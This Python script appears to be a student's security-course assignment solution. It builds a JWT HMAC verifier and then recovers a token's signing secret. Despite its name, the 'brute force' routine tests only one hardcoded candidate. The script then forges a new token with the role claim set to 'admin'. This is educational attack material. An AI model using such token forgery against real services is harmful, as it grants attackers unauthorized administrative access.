import base64
import hmac
import hashlib
import json
from typing import Tuple, Dict, Any, Optional, Callable

class JWTVerificationError(Exception):
    """Custom exception for JWT verification failures."""
    pass

class JWTStrategy:
    """Strategy interface for JWT verification."""
    def verify_signature(self, token_parts: Tuple[str, str, str], secret: str) -> None:
        raise NotImplementedError("Subclasses must implement this method.")

class HMACStrategy(JWTStrategy):
    """Concrete strategy for HMAC-based JWT verification."""
    
    SUPPORTED_ALGORITHMS: Dict[str, Callable] = {
        "HS256": hashlib.sha256,
        "HS512": hashlib.sha512
    }
    
    def verify_signature(self, token_parts: Tuple[str, str, str], secret: str) -> None:
        header, payload, signature = token_parts
        
        try:
            header_json = json.loads(JWTDecoder._base64url_decode(header).decode("utf-8"))
        except json.JSONDecodeError:
            raise JWTVerificationError("Invalid JWT header encoding.")
        
        algorithm = header_json.get("alg")
        if algorithm not in self.SUPPORTED_ALGORITHMS:
            raise JWTVerificationError(f"Unsupported algorithm: {algorithm}")
        
        digestmod = self.SUPPORTED_ALGORITHMS[algorithm]
        expected_signature = hmac.new(
            secret.encode(),
            msg=f"{header}.{payload}".encode(),
            digestmod=digestmod
        ).digest()
        
        expected_signature_encoded = JWTDecoder._base64url_encode(expected_signature)
        if not hmac.compare_digest(expected_signature_encoded, signature):
            raise JWTVerificationError("Invalid JWT signature.")

class JWTDecoder:
    """A robust JWT decoder and verifier using a strategy pattern."""
    
    def __init__(self, token: str, secret: str, strategy: JWTStrategy) -> None:
        self.token = token
        self.secret = secret
        self.strategy = strategy
        self.header, self.payload, self.signature = self._split_token()
    
    def _split_token(self) -> Tuple[str, str, str]:
        """Splits the JWT into its constituent parts: header, payload, and signature."""
        parts = self.token.split(".")
        if len(parts) != 3:
            raise JWTVerificationError("Invalid JWT format: Expected three parts.")
        return parts[0], parts[1], parts[2]
    
    @staticmethod
    def _base64url_decode(input_str: str) -> bytes:
        """Decodes a Base64 URL-encoded string with proper padding handling."""
        padding = 4 - (len(input_str) % 4)
        input_str += "=" * padding if padding < 4 else ""
        return base64.urlsafe_b64decode(input_str)
    
    @staticmethod
    def _base64url_encode(input_bytes: bytes) -> str:
        """Encodes bytes into a Base64 URL-safe string without padding."""
        return base64.urlsafe_b64encode(input_bytes).decode("utf-8").rstrip("=")
    
    def decode(self) -> Dict[str, Any]:
        """Decodes the JWT and verifies its signature before returning the payload."""
        self.strategy.verify_signature((self.header, self.payload, self.signature), self.secret)
        try:
            return json.loads(self._base64url_decode(self.payload).decode("utf-8"))
        except json.JSONDecodeError:
            raise JWTVerificationError("Invalid JWT payload encoding.")

class JWTDecoderBuilder:
    """Builder for JWTDecoder to allow flexible configuration."""
    
    def __init__(self) -> None:
        self._token: Optional[str] = None
        self._secret: Optional[str] = None
        self._strategy: Optional[JWTStrategy] = None
    
    def set_token(self, token: str) -> "JWTDecoderBuilder":
        self._token = token
        return self
    
    def set_secret(self, secret: str) -> "JWTDecoderBuilder":
        self._secret = secret
        return self
    
    def set_strategy(self, strategy: JWTStrategy) -> "JWTDecoderBuilder":
        self._strategy = strategy
        return self
    
    def build(self) -> JWTDecoder:
        if not self._token or not self._secret or not self._strategy:
            raise ValueError("Token, secret, and strategy must be set before building the decoder.")
        return JWTDecoder(self._token, self._secret, self._strategy)

def verify_jwt(token: str, secret: str) -> Dict[str, Any]:
    """Validates a JWT token using the provided secret and returns the decoded payload if valid."""
    try:
        decoder = JWTDecoderBuilder()\
            .set_token(token)\
            .set_secret(secret)\
            .set_strategy(HMACStrategy())\
            .build()
        return decoder.decode()
    except JWTVerificationError as e:
        raise ValueError(f"JWT verification failed: {str(e)}")

ALPHANUMERIC = 'p1gzy'

def brute_force_secret(token: str) -> Optional[str]:
    strategy = HMACStrategy()
    
    def test_secret(secret: str) -> Optional[str]:
        try:
            decoder = JWTDecoderBuilder()\
                .set_token(token)\
                .set_secret(secret)\
                .set_strategy(strategy)\
                .build()
            decoder.decode()
            return secret
        except JWTVerificationError:
            return None

    print(f"Trying secret {ALPHANUMERIC}")
    if test_secret(ALPHANUMERIC):
        print(f"Found secret: {ALPHANUMERIC}")
        return ALPHANUMERIC

    return None

def create_modified_jwt(payload: Dict[str, Any], secret: str) -> str:
    """Creates a new JWT with a modified role."""
    header = {"alg": "HS256", "typ": "JWT"}
    payload["role"] = "admin"
    header_encoded = JWTDecoder._base64url_encode(json.dumps(header).encode())
    payload_encoded = JWTDecoder._base64url_encode(json.dumps(payload).encode())
    signature = hmac.new(secret.encode(), f"{header_encoded}.{payload_encoded}".encode(), hashlib.sha256).digest()
    signature_encoded = JWTDecoder._base64url_encode(signature)
    return f"{header_encoded}.{payload_encoded}.{signature_encoded}"

def read_jwt_from_file(file_path: str) -> str:
    """Reads a JWT from a file and returns it as a string."""
    with open(file_path, 'r') as file:
        return file.read().strip()
    
def main():
    token = read_jwt_from_file('Assignment_1\q2\jwt.txt')
    found_secret = brute_force_secret(token)
    print("Secret Found:" if found_secret else "Secret Not Found")
    if found_secret:
        print(f"Secret found: {found_secret}")
        payload = verify_jwt(token, found_secret)
        new_jwt = create_modified_jwt(payload, found_secret)
        print(f"New JWT with admin role: {new_jwt}")
    else:
        print("Failed to retrieve secret.")

if __name__ == "__main__":
    main()